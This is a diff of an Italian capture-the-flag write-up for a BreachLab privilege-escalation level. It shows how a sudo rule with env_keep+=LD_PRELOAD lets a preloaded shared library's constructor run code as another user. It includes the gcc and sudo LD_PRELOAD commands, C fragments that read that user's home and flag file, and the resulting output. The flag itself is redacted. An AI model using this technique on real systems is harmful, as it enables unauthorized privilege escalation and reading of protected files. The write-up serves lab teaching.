@@ -1,16 +1,26 @@
-# Phantom Track - Phantom 3
+```
+ ========================================================================
+   B R E A C H L A B   ::   F I E L D   N O T E S
+ ------------------------------------------------------------------------
+   phantom track · phile 0x03 · "inheritance"
+ ========================================================================
 
-[← Torna all'indice](../../README.md)
+   target ..: phantom-03  "Inheritance"
+   class ...: privesc / sudo env_keep · LD_PRELOAD
+   tools ...: sudo -l · gcc · shared lib constructor
+   author ..: noflyfre
+   status ..: owned
+```
 
-## Sommario
+[← indice](../../README.md)
 
-- Track: Phantom Track
-- Livello: Phantom 3 — Inheritance
-- Fonte appunti: `phantom_track/phantom03/notes.md`
+> sudo ti lascia lanciare un solo comando innocuo (`id`) come un altro
+> utente. ma è severo sul comando, non su tutto ciò che eredita dalla
+> shell: `env_keep+=LD_PRELOAD` è la porta lasciata aperta.
 
-## Obiettivo
+## ----[ 0x00 · intel ]----
 
-Dal BRIEFING del livello:
+Dal brief:
 
 ```text
 MISSION: Inheritance
@@ -26,13 +36,13 @@ dangerous in with it. A C compiler is present on this box.
 FLAG: owned by the user sudo lets you impersonate — not root.
 ```
 
-Obiettivo: sudo permette di eseguire un solo comando apparentemente innocuo (`/usr/bin/id`) come un altro utente (`flagkeeper3`). Bisogna capire cosa sudo lascia passare dall'ambiente della shell per trasformare quel comando innocuo in esecuzione di codice arbitrario con l'identità di `flagkeeper3`.
+Obiettivo: sudo permette `/usr/bin/id` come `flagkeeper3`. Bisogna capire
+cosa sudo lascia passare dall'ambiente per trasformare quel comando
+innocuo in esecuzione di codice arbitrario come `flagkeeper3`.
 
-## Ricognizione
+## ----[ 0x01 · recon ]----
 
-Enumerazione della propria home: solo dotfile standard e `BRIEFING`, nulla di direttamente sfruttabile.
-
-Verifica dei permessi sudo concessi all'utente:
+Home: solo dotfile e `BRIEFING`. Permessi sudo:
 
 ```bash
 sudo -l
@@ -43,22 +53,36 @@ User phantom3 may run the following commands on phantom:
     (flagkeeper3) NOPASSWD: /usr/bin/id
 ```
 
-Due dettagli chiave in questo output:
+Due dettagli:
 
-1. `phantom3` può eseguire `/usr/bin/id` come `flagkeeper3`, senza password.
-2. Nella configurazione dei `Defaults`, oltre a `env_reset` (che normalmente ripulisce l'ambiente passato al comando eseguito con sudo), è presente `env_keep+=LD_PRELOAD`: questa direttiva dice esplicitamente a sudo di **preservare** la variabile d'ambiente `LD_PRELOAD` invece di scartarla durante il reset dell'ambiente.
+1. `phantom3` può eseguire `/usr/bin/id` come `flagkeeper3`, senza
+   password.
+2. Nei `Defaults`, accanto a `env_reset` (che di norma ripulisce
+   l'ambiente), c'è `env_keep+=LD_PRELOAD`: sudo **preserva**
+   esplicitamente `LD_PRELOAD` invece di scartarla.
 
-## Tecnica
+## ----[ 0x02 · il difetto ]----
 
-`LD_PRELOAD` è una variabile d'ambiente del linker dinamico di Linux che permette di specificare una shared library da caricare prima di tutte le altre nel processo che sta per partire. Se un binario "constructor" è marcato con `__attribute__((constructor))`, il suo codice viene eseguito automaticamente non appena la libreria viene caricata in memoria — prima ancora che parta la `main()` del programma target.
+`LD_PRELOAD` dice al linker dinamico quale shared library caricare prima
+di tutte le altre. Se una libreria ha un `__attribute__((constructor))`,
+il suo codice gira automaticamente al caricamento — prima ancora della
+`main()` del target.
 
-Normalmente sudo, tramite `env_reset`, azzera l'ambiente del processo figlio proprio per prevenire questo tipo di abuso: anche se l'operatore imposta `LD_PRELOAD` nella propria shell, sudo lo rimuoverebbe prima di eseguire il comando con privilegi elevati. Ma la direttiva `env_keep+=LD_PRELOAD` nella policy sudoers **whitelist esplicitamente** questa variabile, dicendo a sudo di mantenerla nell'ambiente del processo eseguito, anche per un comando NOPASSWD ristretto come `/usr/bin/id`.
+Di norma sudo, con `env_reset`, azzera l'ambiente del figlio proprio per
+prevenire questo abuso. Ma `env_keep+=LD_PRELOAD` la **whitelista**
+esplicitamente, mantenendola anche per un comando NOPASSWD ristretto come
+`/usr/bin/id`.
 
-La conseguenza: se si compila una shared library malevola con un constructor e la si passa via `LD_PRELOAD` a `sudo ... /usr/bin/id`, il linker dinamico la carica nel processo `id` eseguito con l'identità (`flagkeeper3`) concessa da sudo — e il codice del constructor gira con quei privilegi, indipendentemente da cosa faccia `id` stesso. In pratica il binario NOPASSWD (`/usr/bin/id`) diventa solo un veicolo: l'esecuzione arbitraria avviene interamente nel constructor della libreria iniettata.
+Conseguenza: si compila una shared library con constructor, la si passa
+via `LD_PRELOAD` a `sudo … /usr/bin/id`, e il linker la carica nel
+processo `id` eseguito come `flagkeeper3`. Il constructor gira con quei
+privilegi, a prescindere da cosa faccia `id`. Il binario NOPASSWD è solo
+il veicolo: l'esecuzione arbitraria avviene nel constructor.
 
-## Sfruttamento
+## ----[ 0x03 · exploit ]----
 
-1. Scrittura di un primo sorgente C con un constructor che enumera e legge i file nella home di `flagkeeper3`, per capire cosa contenga (fase di ricognizione tramite l'exploit stesso):
+1. Primo sorgente C: constructor che enumera e legge la home di
+   `flagkeeper3`, per capire cosa contiene:
 
 ```c
 #include <stdio.h>
@@ -100,16 +124,20 @@ void pwn() {
 }
 ```
 
-2. Compilazione come shared library e uso tramite sudo, preservando `LD_PRELOAD` grazie a `env_keep`:
+2. Compilazione come shared library ed esecuzione via sudo, con
+   `LD_PRELOAD` preservato da `env_keep`:
 
 ```bash
 gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
 sudo LD_PRELOAD=/tmp/evil.so -u flagkeeper3 /usr/bin/id
 ```
 
-L'esecuzione conferma il funzionamento: il constructor gira come `flagkeeper3` e riesce a leggere file protetti nella sua home. Dal `.bash_history` esfiltrato emerge una traccia utile — riportata qui in chiaro perché è output di ricognizione, non la soluzione finale — che mostra come l'operatore avesse già usato in passato `cat /var/lib/phantom-flags/level3_flag` per leggere la flag manualmente in una sessione con privilegi da `flagkeeper3`, rivelando così il percorso esatto del file target.
+Il constructor gira come `flagkeeper3` e legge la sua home. Dal
+`.bash_history` esfiltrato (output di recon, non la soluzione) emerge che
+l'operatore aveva già fatto `cat /var/lib/phantom-flags/level3_flag`,
+rivelando il percorso esatto della flag.
 
-3. Riscrittura del sorgente C per puntare direttamente al file della flag, invece che enumerare l'intera home:
+3. Riscrittura del sorgente per puntare dritto al file flag:
 
 ```c
 #include <stdio.h>
@@ -133,29 +161,25 @@ gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
 sudo LD_PRELOAD=/tmp/evil.so -u flagkeeper3 /usr/bin/id
 ```
 
-Output:
-
 ```
 <REDACTED_FLAG>
 uid=1012(flagkeeper3) gid=1012(flagkeeper3) groups=1012(flagkeeper3)
 ```
 
-La prima riga è il contenuto del file flag, stampato dal constructor durante il caricamento della libreria; la seconda riga è il normale output del comando `/usr/bin/id` eseguito con l'identità di `flagkeeper3`, a conferma che l'intero processo — non solo il constructor — gira con i privilegi impersonati da sudo.
+La prima riga è la flag stampata dal constructor al caricamento; la
+seconda è l'output normale di `id` come `flagkeeper3`, a conferma che
+tutto il processo gira coi privilegi impersonati.
 
-## Risultato
+## ----[ 0x04 · loot ]----
 
-Sfruttando `env_keep+=LD_PRELOAD` nella policy sudoers, insieme a un comando NOPASSWD apparentemente innocuo (`/usr/bin/id` come `flagkeeper3`), è stato possibile iniettare una shared library malevola con un `__attribute__((constructor))` per eseguire codice arbitrario con l'identità di `flagkeeper3`, ottenendo la flag del livello:
+`env_keep+=LD_PRELOAD` + un NOPASSWD innocuo (`/usr/bin/id` come
+`flagkeeper3`) = injection di una shared library con constructor ed
+esecuzione arbitraria come `flagkeeper3`, flag inclusa (valore fuori dal
+writeup). Lezione: sudo può blindare il comando, ma se ti lascia ereditare
+`LD_PRELOAD` il comando non conta più.
 
 ```
-<REDACTED_FLAG>
+--[ eof ]---------------------------------------------------------------
+
+  breachlab.org · phantom track
 ```
-
-## Nota di pubblicazione
-
-Questa è la versione pensata per pubblicazione su GitHub, secondo la dottrina BreachLab: il metodo (analisi di `sudo -l`, individuazione di `env_keep+=LD_PRELOAD`, costruzione di una shared library con constructor, injection via `LD_PRELOAD` su un binario NOPASSWD) è spiegato per intero — comandi, percorsi, sorgenti C e sintassi restano in chiaro. È stato mantenuto in chiaro anche l'output di ricognizione (contenuto di `.bash_history`/`.viminfo`/`.profile` esfiltrato durante la fase esplorativa) perché didatticamente utile e non costituisce la soluzione finale. È stato invece rimosso solo il valore letterale della flag finale.
-
----
-
-## Crediti
-
-Livello risolto su BreachLab — https://breachlab.org (Phantom Track). Writeup pubblicato nel rispetto delle regole della piattaforma: si insegna la tecnica, non si condivide la risposta.
